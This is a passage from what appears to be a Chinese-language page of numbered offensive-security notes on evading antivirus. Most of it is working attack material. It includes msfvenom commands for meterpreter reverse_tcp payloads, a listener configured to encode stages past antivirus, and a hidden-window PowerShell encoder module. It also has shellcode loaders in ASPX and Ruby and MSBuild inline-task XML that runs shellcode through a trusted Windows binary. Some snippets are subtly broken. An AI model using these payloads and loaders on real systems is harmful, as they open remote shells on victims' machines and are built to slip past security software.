<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\</span><br></pre></td></tr></table></figure>
<h2 id="49-关于Powershell对抗安全软件"><a href="#49-关于Powershell对抗安全软件" class="headerlink" title="49. 关于Powershell对抗安全软件"></a>49. 关于Powershell对抗安全软件</h2><p>将以下内容写到<code>/usr/share/metasploit-framework/modules/encoders/powershell/base64.rb</code>文件中</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MetasploitModule</span> &lt; Msf::Encoder</span></span><br><span class="line">	Rank = NormalRanking</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">initialize</span></span></span><br><span class="line">		<span class="keyword">super</span>(</span><br><span class="line">			<span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;Powershell Base64 Encoder&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">				msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=xx -f psh-reflection --arch x64 --platform windows | msfvenom -e powershell/base64 --arch x64 --platform windows.</span></span><br><span class="line"><span class="string">				&#125;</span>,</span><br><span class="line">			<span class="string">&#x27;Author&#x27;</span> =&gt; <span class="string">&#x27;Micropoor&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;Arch&#x27;</span> =&gt; ARCH_CMD,</span><br><span class="line">			<span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>)</span><br><span class="line">		register_options([</span><br><span class="line">			OptBool.new(<span class="string">&#x27;payload&#x27;</span>, [ <span class="literal">false</span>, <span class="string">&#x27;Use payload &#x27;</span>, <span class="literal">false</span> ]),</span><br><span class="line">			OptBool.new(<span class="string">&#x27;x64&#x27;</span>, [ <span class="literal">false</span>, <span class="string">&#x27;Use syswow64 powershell&#x27;</span>, <span class="literal">false</span> ])</span><br><span class="line">		])</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">encode_block</span><span class="params">(state, buf)</span></span></span><br><span class="line">		base64 = Rex::Text.encode_base64(Rex::Text.to_unicode(buf))</span><br><span class="line">		cmd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> datastore[<span class="string">&#x27;x64&#x27;</span>]</span><br><span class="line">			cmd += <span class="string">&#x27;c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe &#x27;</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			cmd += <span class="string">&#x27;powershell.exe &#x27;</span></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">		<span class="keyword">if</span> datastore[<span class="string">&#x27;payload&#x27;</span>]</span><br><span class="line">			cmd += <span class="string">&#x27;-windowstyle hidden -exec bypass -NoExit &#x27;</span></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">		cmd += <span class="string">&quot;-EncodedCommand <span class="subst">#&#123;base64&#125;</span>&quot;</span></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p><code>msfvenom</code>生成<code>Powershell</code>木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.206.129 LPORT&#x3D;8888 -f psh-reflection --arch x64 --platform windows | msfvenom -e powershell&#x2F;base64 --arch x64 --platform windows payload</span><br></pre></td></tr></table></figure>
<h2 id="66-借助aspx对payload进行分离免杀"><a href="#66-借助aspx对payload进行分离免杀" class="headerlink" title="66. 借助aspx对payload进行分离免杀"></a>66. 借助aspx对payload进行分离免杀</h2><ul>
<li>msf监听</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid</span><br><span class="line">set lhost 192.168.1.5</span><br><span class="line">set lport 53</span><br><span class="line">set stageencoder x86&#x2F;shikata_ga_nai  &#x2F;&#x2F;设置编码器</span><br><span class="line">set EnableStageEncoding true   &#x2F;&#x2F;尝试使用不同的编码器对stage进行编码，可能绕过部分杀软的查杀</span><br><span class="line">set exitonsession false   &#x2F;&#x2F;可以在接收到seesion后继续监听端口，保持侦听</span><br></pre></td></tr></table></figure>
<ul>
<li>msfvenom生成payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid LHOST&#x3D;192.168.1.5 LPORT&#x3D;53 EnableStageEncoding&#x3D;true stageencoder&#x3D;x86&#x2F;shikata_ga_nai -e x86&#x2F;shikata_ga_nai -i 5 -f csharp</span><br></pre></td></tr></table></figure>
<ul>
<li>分离免杀Code</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;C#&quot; AutoEventWireup&#x3D;&quot;true&quot; Inherits&#x3D;&quot;System.Web.UI.Page&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace&#x3D;&quot;System&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace&#x3D;&quot;System.Runtime.InteropServices&quot; %&gt;</span><br><span class="line">&lt;script runat&#x3D;&quot;server&quot;&gt;</span><br><span class="line">delegate int MsfpayloadProc();</span><br><span class="line">protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">    byte[] buf &#x3D; new byte[509] &#123;</span><br><span class="line">0xda,0xda,0xba,0xb0,0x17,0xa3,0xe9,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,</span><br><span class="line">0x79,0x31,0x50,0x19,0x03,0x50,0x19,0x83,0xc0,0x04,0x52,0xe2,0x1b,0x10,0x28,</span><br><span class="line">0x74,0x47,0x39,0x91,0x5e,0x03,0x99,0xdd,0x3b,0xdd,0x28,0xac,0xce,0x2c,0xe9,</span><br><span class="line">0xdb,0x2d,0x0d,0xf8,0x60,0xf3,0x95,0xe0,0x6a,0xf6,0x68,0x1d,0x67,0x0c,0xb7,</span><br><span class="line">0xe1,0xb7,0x79,0x45,0x29,0x28,0x22,0x81,0x57,0x25,0x78,0x6f,0x23,0x41,0x0a,</span><br><span class="line">0x6e,0x36,0xb6,0x07,0x89,0x46,0x67,0x00,0xaa,0x35,0x66,0x4a,0x0b,0x75,0x56,</span><br><span class="line">0x3c,0xfd,0x05,0x86,0x00,0x93,0xdc,0x73,0x7a,0xc5,0x3e,0x4f,0xe4,0xb8,0x21,</span><br><span class="line">0x01,0xc9,0xe6,0x24,0xc6,0x54,0xc5,0x85,0x44,0x50,0xec,0xf1,0x05,0x9f,0x59,</span><br><span class="line">0x85,0x3e,0xa8,0x6b,0x1e,0x0b,0x35,0x0e,0xab,0xfa,0x90,0xf4,0x52,0x4d,0x8d,</span><br><span class="line">0xf4,0x2c,0xb0,0xcb,0x72,0x75,0x71,0x87,0xcc,0x81,0x30,0x58,0x6c,0x2a,0xd3,</span><br><span class="line">0x82,0x1b,0x83,0x69,0x5c,0x84,0x0e,0xea,0x69,0x8c,0x7a,0xc3,0xd3,0xba,0x65,</span><br><span class="line">0x4c,0x06,0x38,0x1c,0x06,0x13,0x0d,0xf6,0xd0,0x8b,0xf3,0x35,0x0b,0x84,0x71,</span><br><span class="line">0x09,0x49,0x2a,0x7d,0xbe,0x13,0x76,0x0d,0x0a,0xca,0x34,0x83,0xa0,0xb2,0x2c,</span><br><span class="line">0x66,0x4f,0xd5,0x91,0x11,0xf9,0x92,0x6b,0x61,0xc6,0x7f,0xc2,0x7c,0x2d,0x3a,</span><br><span class="line">0xc3,0xc2,0x30,0x7e,0x0c,0x22,0x55,0x12,0x49,0xa7,0x5d,0x5f,0xe7,0x75,0x7d,</span><br><span class="line">0x89,0x0f,0xd2,0x51,0x4b,0x67,0x0f,0xbc,0x36,0xcc,0x46,0xd0,0x92,0x5a,0x50,</span><br><span class="line">0xe7,0x3b,0xed,0xb4,0xf4,0xba,0xc3,0xda,0x60,0x5e,0xde,0x4e,0xbc,0xce,0x0e,</span><br><span class="line">0x24,0xf1,0x5e,0xc0,0x92,0x9d,0xf6,0xe2,0x94,0xe8,0xef,0xb7,0x9b,0x43,0xec,</span><br><span class="line">0xb9,0xe6,0x3d,0xd1,0xc8,0xeb,0x54,0x23,0x24,0x55,0xb7,0x77,0x5f,0x28,0xb9,</span><br><span class="line">0xf5,0x80,0x12,0x11,0xaa,0x1d,0x0a,0xea,0xe0,0xb7,0xa8,0xc8,0xf5,0xfb,0xf2,</span><br><span class="line">0x90,0x4d,0xe8,0x7c,0xe6,0x6a,0x3b,0x60,0x1d,0xce,0x1a,0xdf,0x1c,0x46,0x6c,</span><br><span class="line">0x94,0xff,0x30,0x7a,0x99,0xdd,0x09,0x1e,0xb6,0xcf,0xe5,0x4f,0xfd,0x57,0x35,</span><br><span class="line">0xd1,0xf7,0xd8,0x96,0x16,0xf7,0x74,0xc2,0x91,0xcc,0x9d,0xa1,0xa9,0x94,0x97,</span><br><span class="line">0x5b,0xf6,0x90,0x1f,0x85,0x3c,0x5c,0xcc,0xf2,0x11,0x6c,0xdd,0x7b,0x8c,0x5d,</span><br><span class="line">0xa4,0xd3,0xe9,0x2c,0xa6,0xc9,0x06,0xa7,0x0e,0x54,0x41,0xac,0xf0,0xfc,0x30,</span><br><span class="line">0x16,0x49,0x5f,0x48,0x2d,0x19,0x33,0x83,0x2a,0x45,0x0a,0xfa,0xd6,0xba,0x72,</span><br><span class="line">0x76,0xbf,0xfd,0xce,0x4e,0xad,0x0e,0xc8,0xc9,0x20,0xb4,0x16,0x86,0xc4,0x72,</span><br><span class="line">0x74,0x5d,0x91,0x5a,0xcb,0xba,0xdf,0xe7,0xc7,0x07,0x96,0x51,0x15,0x8a,0xdf,</span><br><span class="line">0xff,0xc5,0x84,0x8e,0x59,0xfa,0x60,0x9f,0x74,0x85,0xdf,0xe8,0x77,0x50,0x03,</span><br><span class="line">0x61,0x0c,0xfe,0xad,0x28,0x16,0x3d,0x93,0xc8,0x6a,0x0b,0xda,0x20,0x7e,0xfa,</span><br><span class="line">0xa7,0xf3,0x9d,0x18,0x18,0x3a,0x98,0xe7,0xbc,0x4b,0x59,0x39,0xc6,0x9e,0xbb,</span><br><span class="line">0xa8,0xa7,0x7f,0xc6,0xa2,0x8a,0xc9,0x23,0x48,0x94,0xa3,0xd6,0x5a,0x6b,0x99,</span><br><span class="line">0xee,0x30,0x7f,0x6b,0x89,0xb3,0x62,0xd2,0x27,0xae,0xdb,0x37,0x9e,0x19,0xc1,</span><br><span class="line">0x42,0x30,0x98,0x1c,0xa2,0xe2,0x46,0x65,0xec,0x49,0xa9,0x27,0xc8,0x4b &#125;;</span><br><span class="line">    IntPtr handle &#x3D; IntPtr.Zero;</span><br><span class="line">    handle &#x3D; VirtualAlloc(</span><br><span class="line">        IntPtr.Zero,</span><br><span class="line">        codeBytes.Length,</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    try</span><br><span class="line">        &#123;</span><br><span class="line">            Marshal.Copy(codeBytes, 0, handle, codeBytes.Length);</span><br><span class="line">            MsfpayloadProc msfpayload &#x3D; Marshal.GetDelegateForFunctionPointer(handle, typeof(MsfpayloadProc)) as MsfpayloadProc;</span><br><span class="line">            msfpayload();</span><br><span class="line">        &#125;</span><br><span class="line">    finally</span><br><span class="line">        &#123;</span><br><span class="line">            VirtualFree(handle, 0, MEM_RELEASE);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    [DllImport(&quot;Kernel32.dll&quot;, EntryPoint &#x3D; &quot;VirtualAlloc&quot;)]</span><br><span class="line">    public static extern IntPtr VirtualAlloc(IntPtr address, int size, ui ntallocType, uint protect);</span><br><span class="line">    [DllImport(&quot;Kernel32.dll&quot;, EntryPoint &#x3D; &quot;VirtualFree&quot;)]</span><br><span class="line">    public static extern bool VirtualFree(IntPtr address, int size, uint freeType);</span><br><span class="line">    const uint MEM_COMMIT &#x3D; 0x1000;</span><br><span class="line">    const uint MEM_RESERVE &#x3D; 0x2000;</span><br><span class="line">    const uint PAGE_EXECUTE_READWRITE &#x3D; 0x40;</span><br><span class="line">    const uint MEM_RELEASE &#x3D; 0x8000;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="68-基于Ruby内存加载shellcode第一季"><a href="#68-基于Ruby内存加载shellcode第一季" class="headerlink" title="68. 基于Ruby内存加载shellcode第一季"></a>68. 基于Ruby内存加载shellcode第一季</h2><ul>
<li>msfvenom生成payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;messagebox TEXT&#x3D;Micropoor TITLE&#x3D;Micropoor ‐f ruby ‐‐smallest</span><br></pre></td></tr></table></figure>
<ul>
<li>编译ruby版shellcode</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle/import&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fiddle/types&#x27;</span></span><br><span class="line"> </span><br><span class="line">shellcode =</span><br><span class="line"><span class="string">&quot;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01&quot;</span> +</span><br><span class="line"><span class="string">&quot;\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span> Fiddle</span><br><span class="line"> </span><br><span class="line">kernel32 = Fiddle.dlopen(<span class="string">&#x27;kernel32&#x27;</span>)</span><br><span class="line">ptr = Function.new(kernel32[<span class="string">&#x27;VirtualAlloc&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(<span class="number">0</span>, shellcode.size, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">Function.new(kernel32[<span class="string">&#x27;VirtualProtect&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(ptr, shellcode.size, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">buf = Fiddle::Pointer[shellcode]</span><br><span class="line"> </span><br><span class="line">Function.new(kernel32[<span class="string">&#x27;RtlMoveMemory&#x27;</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>], <span class="number">4</span>).call(ptr, buf, s</span><br><span class="line">hellcode.size)</span><br><span class="line">thread = Function.new(kernel32[<span class="string">&#x27;CreateThread&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>],<span class="number">4</span>).call(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">Function.new(kernel32[<span class="string">&#x27;WaitForSingleObject&#x27;</span>], [<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(thread,‐<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h2 id="71-基于白名单Msbuild-exe执行payload第一季"><a href="#71-基于白名单Msbuild-exe执行payload第一季" class="headerlink" title="71. 基于白名单Msbuild.exe执行payload第一季"></a>71. 基于白名单Msbuild.exe执行payload第一季</h2><ul>
<li>WIN 7 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>msfvenom生成shellcode</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.5.99 LPORT=10129 -f csharp</span><br></pre></td></tr></table></figure>
<ul>
<li>executes shellcode.xml</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Project ToolsVersion&#x3D;&quot;4.0&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;developer&#x2F;msbuild&#x2F;2003&quot;&gt;</span><br><span class="line">  &lt;!-- This inline task executes shellcode. --&gt;</span><br><span class="line">  &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;</span><br><span class="line">  &lt;!-- Save This File And Execute The Above Command --&gt;</span><br><span class="line">  &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt; </span><br><span class="line">  &lt;!-- License: BSD 3-Clause --&gt;</span><br><span class="line">  &lt;Target Name&#x3D;&quot;Hello&quot;&gt;</span><br><span class="line">    &lt;ClassExample &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName&#x3D;&quot;ClassExample&quot;</span><br><span class="line">    TaskFactory&#x3D;&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile&#x3D;&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">    </span><br><span class="line">      &lt;Code Type&#x3D;&quot;Class&quot; Language&#x3D;&quot;cs&quot;&gt;</span><br><span class="line">      &lt;![CDATA[</span><br><span class="line">        using System;</span><br><span class="line">        using System.Runtime.InteropServices;</span><br><span class="line">        using Microsoft.Build.Framework;</span><br><span class="line">        using Microsoft.Build.Utilities;</span><br><span class="line">        public class ClassExample :  Task, ITask</span><br><span class="line">        &#123;         </span><br><span class="line">          private static UInt32 MEM_COMMIT &#x3D; 0x1000;          </span><br><span class="line">          private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern IntPtr CreateThread(            </span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId           </span><br><span class="line">            );</span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 WaitForSingleObject(           </span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">            );          </span><br><span class="line">          public override bool Execute()</span><br><span class="line">          &#123;</span><br><span class="line">            byte[] shellcode &#x3D; new byte[195] &#123;</span><br><span class="line">              0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,</span><br><span class="line">              0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,</span><br><span class="line">              0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,</span><br><span class="line">              0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,</span><br><span class="line">              0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,</span><br><span class="line">              0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,</span><br><span class="line">              0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,</span><br><span class="line">              0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,</span><br><span class="line">              0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,</span><br><span class="line">              0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,</span><br><span class="line">              0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,</span><br><span class="line">              0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,</span><br><span class="line">              0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x20,0x63,0x00 &#125;;</span><br><span class="line">              </span><br><span class="line">              UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">                MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">              IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">              UInt32 threadId &#x3D; 0;</span><br><span class="line">              IntPtr pinfo &#x3D; IntPtr.Zero;</span><br><span class="line">              hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">              WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">              return true;</span><br><span class="line">          &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">      ]]&gt;</span><br><span class="line">      &lt;&#x2F;Code&gt;</span><br><span class="line">    &lt;&#x2F;Task&gt;</span><br><span class="line">  &lt;&#x2F;UsingTask&gt;</span><br><span class="line">&lt;&#x2F;Project&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>executes x64 shellcode.xml</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Project ToolsVersion&#x3D;&quot;4.0&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;developer&#x2F;msbuild&#x2F;2003&quot;&gt;</span><br><span class="line">  &lt;!-- This inline task executes x64 shellcode. --&gt;</span><br><span class="line">  &lt;!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;</span><br><span class="line">  &lt;!-- Save This File And Execute The Above Command --&gt;</span><br><span class="line">  &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt; </span><br><span class="line">  &lt;!-- License: BSD 3-Clause --&gt;</span><br><span class="line">  &lt;Target Name&#x3D;&quot;Hello&quot;&gt;</span><br><span class="line">    &lt;ClassExample &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName&#x3D;&quot;ClassExample&quot;</span><br><span class="line">    TaskFactory&#x3D;&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile&#x3D;&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">    </span><br><span class="line">      &lt;Code Type&#x3D;&quot;Class&quot; Language&#x3D;&quot;cs&quot;&gt;</span><br><span class="line">      &lt;![CDATA[</span><br><span class="line">        using System;</span><br><span class="line">        using System.Runtime.InteropServices;</span><br><span class="line">        using Microsoft.Build.Framework;</span><br><span class="line">        using Microsoft.Build.Utilities;</span><br><span class="line">        public class ClassExample :  Task, ITask</span><br><span class="line">        &#123;         </span><br><span class="line">          private static UInt32 MEM_COMMIT &#x3D; 0x1000;          </span><br><span class="line">          private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern IntPtr CreateThread(            </span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId           </span><br><span class="line">            );</span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 WaitForSingleObject(           </span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">            );          </span><br><span class="line">          public override bool Execute()</span><br><span class="line">          &#123;</span><br><span class="line">            byte[] shellcode &#x3D; new byte[276] &#123;</span><br><span class="line">              0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,</span><br><span class="line">              0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,</span><br><span class="line">              0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,</span><br><span class="line">              0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,</span><br><span class="line">              0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,</span><br><span class="line">              0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,</span><br><span class="line">              0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,</span><br><span class="line">              0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,</span><br><span class="line">              0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,</span><br><span class="line">              0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,</span><br><span class="line">              0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,</span><br><span class="line">              0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,</span><br><span class="line">              0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,</span><br><span class="line">              0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,</span><br><span class="line">              0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,</span><br><span class="line">              0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,</span><br><span class="line">              0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,</span><br><span class="line">              0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,</span><br><span class="line">              0x63,0x2e,0x65,0x78,0x65,0x00 &#125;;</span><br><span class="line">              </span><br><span class="line">              UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">                MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">              IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">              UInt32 threadId &#x3D; 0;</span><br><span class="line">              IntPtr pinfo &#x3D; IntPtr.Zero;</span><br><span class="line">              hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">              WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">              return true;</span><br><span class="line">          &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">      